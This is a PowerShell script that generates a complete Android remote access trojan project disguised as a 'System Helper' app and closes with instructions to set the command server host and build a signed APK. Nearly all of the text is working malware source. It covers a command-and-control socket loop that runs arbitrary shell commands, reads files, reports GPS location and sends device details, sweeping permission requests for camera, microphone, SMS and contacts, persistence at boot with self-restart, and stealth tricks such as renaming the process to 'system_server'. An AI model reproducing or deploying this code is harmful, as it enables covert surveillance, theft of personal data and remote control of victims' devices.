# ============================================================
# ANDROID RAT PROJECT GENERATOR – WINDOWS POWERSHELL EDITION
# Creates full Android Studio project with all files/folders
# ============================================================

$PROJECT_NAME = "SysHelper"
$PACKAGE = "com.syshelper"
$PKG_PATH = "app/src/main/java/com/syshelper"

# Create directory structure
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/java/com/syshelper/utils" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/res/layout" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/res/values" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/res/drawable" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/res/mipmap-hdpi" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/res/mipmap-mdpi" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/res/mipmap-xhdpi" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/res/mipmap-xxhdpi" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/res/mipmap-xxxhdpi" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/gradle/wrapper" | Out-Null
New-Item -ItemType Directory -Force -Path "$PROJECT_NAME/app/src/main/cpp" | Out-Null

Push-Location $PROJECT_NAME

# ============================================================
# 1. PROJECT-LEVEL build.gradle
# ============================================================
@"
// Top-level build file
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:7.4.2'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
"@ | Out-File -FilePath build.gradle -Encoding UTF8

# ============================================================
# 2. SETTINGS.GRADLE
# ============================================================
@"
pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "SysHelper"
include ':app'
"@ | Out-File -FilePath settings.gradle -Encoding UTF8

# ============================================================
# 3. GRADLE PROPERTIES
# ============================================================
@"
org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
android.useAndroidX=true
android.enableJetifier=true
"@ | Out-File -FilePath gradle.properties -Encoding UTF8

# ============================================================
# 4. GRADLE WRAPPER (MINIMAL)
# ============================================================
@"
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-7.5-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
"@ | Out-File -FilePath gradle/wrapper/gradle-wrapper.properties -Encoding UTF8

# ============================================================
# 5. APP-LEVEL build.gradle
# ============================================================
@"
plugins {
    id 'com.android.application'
}

android {
    compileSdk 34
    namespace 'com.syshelper'

    defaultConfig {
        applicationId "com.syshelper"
        minSdk 26
        targetSdk 34
        versionCode 1
        versionName "1.0"
        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
    }

    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            minifyEnabled false
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }

    externalNativeBuild {
        cmake {
            path "src/main/cpp/CMakeLists.txt"
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.9.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.core:core:1.12.0'
    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
}
"@ | Out-File -FilePath app/build.gradle -Encoding UTF8

# ============================================================
# 6. PROGUARD RULES
# ============================================================
@"
# Obfuscation
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable

# Keep services
-keep class com.syshelper.CoreService { *; }
-keep class com.syshelper.BootReceiver { *; }

# Remove logs
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}
"@ | Out-File -FilePath app/proguard-rules.pro -Encoding UTF8

# ============================================================
# 7. ANDROID MANIFEST
# ============================================================
@"
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Permissions -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.SysHelper"
        android:usesCleartextTraffic="true"
        android:requestLegacyExternalStorage="false"
        tools:targetApi="33">

        <activity android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service android:name=".CoreService"
            android:exported="false"
            android:enabled="true"
            android:foregroundServiceType="mediaProjection|camera|microphone|location" />

        <receiver android:name=".BootReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
"@ | Out-File -FilePath app/src/main/AndroidManifest.xml -Encoding UTF8

# ============================================================
# 8. MAINACTIVITY.JAVA
# ============================================================
@"
package com.syshelper;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final int SCREEN_RECORD_REQUEST = 456;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Request all permissions
        requestAllPermissions();

        // Overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                startActivity(intent);
            }
        }

        // Start foreground service
        Intent serviceIntent = new Intent(this, CoreService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Request screen recording
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.media.projection.MediaProjectionManager mpManager =
                (android.media.projection.MediaProjectionManager)
                getSystemService(MEDIA_PROJECTION_SERVICE);
            Intent intent = mpManager.createScreenCaptureIntent();
            startActivityForResult(intent, SCREEN_RECORD_REQUEST);
        }

        // Hide activity
        finish();
    }

    private void requestAllPermissions() {
        String[] permissions = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            for (String perm : permissions) {
                if (ContextCompat.checkSelfPermission(this, perm)
                    != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this,
                        new String[]{perm}, PERMISSION_REQUEST_CODE);
                }
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SCREEN_RECORD_REQUEST) {
            if (resultCode == RESULT_OK) {
                // Pass to CoreService
                Intent intent = new Intent(this, CoreService.class);
                intent.putExtra("screenData", data);
                intent.putExtra("screenResult", resultCode);
                startService(intent);
            }
        }
    }
}
"@ | Out-File -FilePath "$PKG_PATH/MainActivity.java" -Encoding UTF8

# ============================================================
# 9. CoreService.java
# ============================================================
@"
package com.syshelper;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import androidx.core.app.NotificationCompat;
import java.net.Socket;

public class CoreService extends Service {
    private PowerManager.WakeLock wakeLock;
    private ConnectionManager connectionManager;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, buildNotification());

        // Wake lock
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SysHelper:wake");
        wakeLock.acquire(10*60*1000L);

        // Start connection
        connectionManager = new ConnectionManager(this);
        connectionManager.start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("rat_channel",
                "System Service", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Background service");
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, "rat_channel")
            .setContentTitle("System Helper")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (connectionManager != null) connectionManager.stop();
        // Auto-restart
        Intent restart = new Intent(this, CoreService.class);
        startService(restart);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
"@ | Out-File -FilePath "$PKG_PATH/CoreService.java" -Encoding UTF8

# ============================================================
# 10. BootReceiver.java
# ============================================================
@"
package com.syshelper;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
            Intent.ACTION_QUICKBOOT_POWERON.equals(intent.getAction())) {
            Intent serviceIntent = new Intent(context, CoreService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
"@ | Out-File -FilePath "$PKG_PATH/BootReceiver.java" -Encoding UTF8

# ============================================================
# 11. ConnectionManager.java
# ============================================================
@"
package com.syshelper;

import android.content.Context;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;

public class ConnectionManager {
    private Context context;
    private Thread worker;
    private volatile boolean running = true;
    private static final String C2_HOST = "your-domain.duckdns.org";
    private static final int C2_PORT = 443;

    public ConnectionManager(Context context) {
        this.context = context;
    }

    public void start() {
        worker = new Thread(() -> {
            while (running) {
                try {
                    InetAddress addr = InetAddress.getByName(C2_HOST);
                    Socket socket = new Socket(addr.getHostAddress(), C2_PORT);
                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                    BufferedReader in = new BufferedReader(
                        new InputStreamReader(socket.getInputStream())
                    );

                    String deviceInfo = DeviceInfo.getInfo(context);
                    out.writeBytes(deviceInfo + "\n");
                    out.flush();

                    String cmd;
                    while ((cmd = in.readLine()) != null && running) {
                        String response = CommandExecutor.execute(cmd, context);
                        out.writeBytes(response + "\n");
                        out.flush();
                    }
                    socket.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                try { Thread.sleep(30000); } catch (InterruptedException ignored) {}
            }
        });
        worker.start();
    }

    public void stop() {
        running = false;
        if (worker != null) worker.interrupt();
    }
}
"@ | Out-File -FilePath "$PKG_PATH/ConnectionManager.java" -Encoding UTF8

# ============================================================
# 12. CommandExecutor.java
# ============================================================
@"
package com.syshelper;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class CommandExecutor {
    public static String execute(String cmd, Context context) {
        try {
            if (cmd.startsWith("SHELL ")) {
                String shellCmd = cmd.substring(6);
                Process p = Runtime.getRuntime().exec(shellCmd);
                BufferedReader br = new BufferedReader(
                    new InputStreamReader(p.getInputStream())
                );
                StringBuilder out = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    out.append(line).append("\n");
                }
                return out.toString();
            } else if (cmd.equals("LOCATION")) {
                LocationManager lm = (LocationManager)
                    context.getSystemService(Context.LOCATION_SERVICE);
                Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc != null) {
                    return "LAT:" + loc.getLatitude() +
                           "|LON:" + loc.getLongitude() +
                           "|ACC:" + loc.getAccuracy();
                }
                return "LOCATION_UNAVAILABLE";
            } else if (cmd.equals("PING")) {
                return "PONG";
            } else if (cmd.startsWith("GET ")) {
                String path = cmd.substring(4);
                return FileUtils.readFile(path);
            }
            return "UNKNOWN_COMMAND";
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }
}
"@ | Out-File -FilePath "$PKG_PATH/CommandExecutor.java" -Encoding UTF8

# ============================================================
# 13. DeviceInfo.java
# ============================================================
@"
package com.syshelper;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;

public class DeviceInfo {
    public static String getInfo(Context context) {
        TelephonyManager tm = (TelephonyManager)
            context.getSystemService(Context.TELEPHONY_SERVICE);
        return Build.MODEL + "|" +
               Build.VERSION.RELEASE + "|" +
               Build.VERSION.SDK_INT + "|" +
               tm.getSimCountryIso() + "|" +
               tm.getNetworkOperatorName();
    }
}
"@ | Out-File -FilePath "$PKG_PATH/DeviceInfo.java" -Encoding UTF8

# ============================================================
# 14. CryptoUtils.java
# ============================================================
@"
package com.syshelper;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import android.util.Base64;

public class CryptoUtils {
    private static final String ALGO = "AES";
    private static final byte[] KEY = "16ByteStaticKey!".getBytes();

    public static String encrypt(String data) throws Exception {
        Cipher c = Cipher.getInstance(ALGO);
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(KEY, ALGO));
        return Base64.encodeToString(c.doFinal(data.getBytes()), Base64.DEFAULT);
    }

    public static String decrypt(String data) throws Exception {
        Cipher c = Cipher.getInstance(ALGO);
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(KEY, ALGO));
        return new String(c.doFinal(Base64.decode(data, Base64.DEFAULT)));
    }
}
"@ | Out-File -FilePath "$PKG_PATH/CryptoUtils.java" -Encoding UTF8

# ============================================================
# 15. PermissionsHelper.java
# ============================================================
@"
package com.syshelper;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class PermissionsHelper {
    public static boolean hasAllPermissions(Activity activity) {
        String[] perms = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION
        };
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(activity, p)
                != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    public static void requestAll(Activity activity, int code) {
        String[] perms = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS
        };
        ActivityCompat.requestPermissions(activity, perms, code);
    }
}
"@ | Out-File -FilePath "$PKG_PATH/PermissionsHelper.java" -Encoding UTF8

# ============================================================
# 16. UTILS – NetworkUtils.java
# ============================================================
@"
package com.syshelper.utils;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;

public class NetworkUtils {
    public static boolean isConnected(Context context) {
        ConnectivityManager cm = (ConnectivityManager)
            context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm.getActiveNetworkInfo();
        return ni != null && ni.isConnected();
    }

    public static String getLocalIP() {
        try {
            List<NetworkInterface> interfaces =
                Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface ni : interfaces) {
                List<InetAddress> addrs = Collections.list(ni.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "127.0.0.1";
    }
}
"@ | Out-File -FilePath "$PKG_PATH/utils/NetworkUtils.java" -Encoding UTF8

# ============================================================
# 17. UTILS – FileUtils.java
# ============================================================
@"
package com.syshelper.utils;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.File;

public class FileUtils {
    public static String readFile(String path) {
        try {
            BufferedReader br = new BufferedReader(new FileReader(path));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
            br.close();
            return sb.toString();
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }

    public static boolean writeFile(String path, String content) {
        try {
            FileWriter fw = new FileWriter(new File(path));
            fw.write(content);
            fw.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
"@ | Out-File -FilePath "$PKG_PATH/utils/FileUtils.java" -Encoding UTF8

# ============================================================
# 18. UTILS – Logger.java
# ============================================================
@"
package com.syshelper.utils;

import android.util.Log;

public class Logger {
    private static final String TAG = "SysHelper";

    public static void d(String msg) {
        Log.d(TAG, msg);
    }

    public static void e(String msg) {
        Log.e(TAG, msg);
    }

    public static void e(String msg, Throwable t) {
        Log.e(TAG, msg, t);
    }

    public static void i(String msg) {
        Log.i(TAG, msg);
    }
}
"@ | Out-File -FilePath "$PKG_PATH/utils/Logger.java" -Encoding UTF8

# ============================================================
# 19. LAYOUT – activity_main.xml
# ============================================================
@"
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:background="#1a1a2e">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="System Helper"
        android:textColor="#ffffff"
        android:textSize="24sp"
        android:layout_marginBottom="20dp"/>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Loading..."
        android:textColor="#888888"
        android:textSize="16sp"/>
</LinearLayout>
"@ | Out-File -FilePath "app/src/main/res/layout/activity_main.xml" -Encoding UTF8

# ============================================================
# 20. STRINGS.XML
# ============================================================
@"
<resources>
    <string name="app_name">SysHelper</string>
</resources>
"@ | Out-File -FilePath "app/src/main/res/values/strings.xml" -Encoding UTF8

# ============================================================
# 21. COLORS.XML
# ============================================================
@"
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="purple_200">#FFBB86FC</color>
    <color name="purple_500">#FF6200EE</color>
    <color name="purple_700">#FF3700B3</color>
    <color name="teal_200">#FF03DAC5</color>
    <color name="teal_700">#FF018786</color>
    <color name="black">#FF000000</color>
    <color name="white">#FFFFFFFF</color>
</resources>
"@ | Out-File -FilePath "app/src/main/res/values/colors.xml" -Encoding UTF8

# ============================================================
# 22. THEMES.XML
# ============================================================
@"
<resources xmlns:tools="http://schemas.android.com/tools">
    <style name="Theme.SysHelper" parent="Theme.MaterialComponents.DayNight.NoActionBar">
        <item name="colorPrimary">@color/purple_500</item>
        <item name="colorPrimaryVariant">@color/purple_700</item>
        <item name="colorOnPrimary">@color/white</item>
        <item name="colorSecondary">@color/teal_200</item>
        <item name="colorSecondaryVariant">@color/teal_700</item>
        <item name="colorOnSecondary">@color/black</item>
        <item name="android:statusBarColor">?attr/colorPrimaryVariant</item>
    </style>
</resources>
"@ | Out-File -FilePath "app/src/main/res/values/themes.xml" -Encoding UTF8

# ============================================================
# 23. CMAKE (C++ Native Support)
# ============================================================
@"
cmake_minimum_required(VERSION 3.18.1)
project("syshelper")

add_library(native-lib SHARED native-lib.cpp)

find_library(log-lib log)

target_link_libraries(native-lib ${log-lib})
"@ | Out-File -FilePath "app/src/main/cpp/CMakeLists.txt" -Encoding UTF8

# ============================================================
# 24. NATIVE-LIB.CPP
# ============================================================
@"
#include <jni.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <string.h>

extern "C" JNIEXPORT void JNICALL
Java_com_syshelper_CoreService_stealth(JNIEnv *env, jobject thiz) {
    // Rename process to hide
    prctl(PR_SET_NAME, "system_server", 0, 0, 0);
    // Disable debugging
    prctl(PR_SET_DUMPABLE, 0, 0, 0);
}
"@ | Out-File -FilePath "app/src/main/cpp/native-lib.cpp" -Encoding UTF8

# ============================================================
# 25. DUMMY ICON (Simple XML)
# ============================================================
@"
<vector xmlns:android="http://schemas.android.com/apk/res/android"
    android:width="24dp"
    android:height="24dp"
    android:viewportWidth="24"
    android:viewportHeight="24">
    <path
        android:fillColor="#FF6200EE"
        android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10 10-4.48 10-10S17.52,2 12,2z"/>
</vector>
"@ | Out-File -FilePath "app/src/main/res/drawable/ic_launcher.xml" -Encoding UTF8

# ============================================================
# 26. GRADLE WRAPPER EXECUTABLES (MINIMAL)
# ============================================================
@"
#!/bin/sh
exec java -jar gradle/wrapper/gradle-wrapper.jar "$@"
"@ | Out-File -FilePath gradlew -Encoding UTF8

@"
@echo off
java -jar gradle/wrapper/gradle-wrapper.jar %*
"@ | Out-File -FilePath gradlew.bat -Encoding UTF8

Pop-Location

Write-Host ""
Write-Host "============================================================"
Write-Host "✅ PROJECT GENERATED SUCCESSFULLY!"
Write-Host "============================================================"
Write-Host ""
Write-Host "Next steps:"
Write-Host "1. Open Android Studio"
Write-Host "2. File → Open → select the '$PROJECT_NAME' folder"
Write-Host "3. Wait for Gradle sync"
Write-Host "4. Update C2_HOST in ConnectionManager.java"
Write-Host "5. Build → Generate Signed APK"
Write-Host ""
Write-Host "Happy hacking - Lisa says hi! 😈"
Write-Host "============================================================"